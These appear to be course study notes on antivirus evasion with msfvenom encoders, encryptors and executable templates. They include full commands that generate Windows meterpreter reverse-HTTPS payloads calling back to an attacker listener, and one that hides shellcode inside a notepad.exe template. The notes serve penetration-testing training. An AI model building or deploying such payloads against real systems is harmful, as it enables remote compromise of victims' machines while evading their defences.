# 05.04 msfvenom Encoders Encryptors

> Section 6.4 · shikata_ga_nai, zutto_dekiru, notepad template, aes256

## Overview

Metasploit encoders (msfencode) obfuscate shellcode but their static decoder stubs are themselves fingerprinted by AV — x86/shikata_ga_nai bypasses ClamAV but fails Avira. Encryptors (--encrypt) suffer the same problem: the decryption routine is static. Using a custom --template (-x) option injects shellcode into a legitimate signed binary, but Avira still detects the template. Conclusion from the textbook: msfvenom encoders and encryptors are no longer effective general-purpose AV bypasses; custom code is required.

## Steps

- **List encoders** — `msfvenom --list encoders` — x86/shikata_ga_nai (excellent) is a polymorphic XOR encoder.
- **32-bit encoder** — `-e x86/shikata_ga_nai` produces different output each run but ClamAV flags the static decoder stub.
- **64-bit unencoded** — plain 64-bit meterpreter passes ClamAV by default but Avira detects it.
- **64-bit encoder** — `-e x64/zutto_dekiru` — Avira still detects the decoder; `-x notepad.exe` template also flagged.
- **Encryptors** — `--encrypt aes256 --encrypt-key <key>` — the decryption stub is static and Avira detects it.
- **Why they fail** — static decoder/decryptor stubs are separately fingerprinted by AV vendors.

## Commands

### List encoders

```bash
kali@kali:~$ msfvenom --list encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
 ...
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
...
```

### Encoders and template

```bash
# 32-bit polymorphic XOR encoder — produces different output each run
kali@kali:~$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe

# 64-bit encoder
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o /var/www/html/met64_zutto.exe

# Inject shellcode into a signed notepad.exe template
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe
```

### Encryptors

```bash
# List available encryption types
kali@kali:~$ msfvenom --list encrypt

Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor

# AES256 encryption — decryption stub is static and still flagged by AV
kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe
```
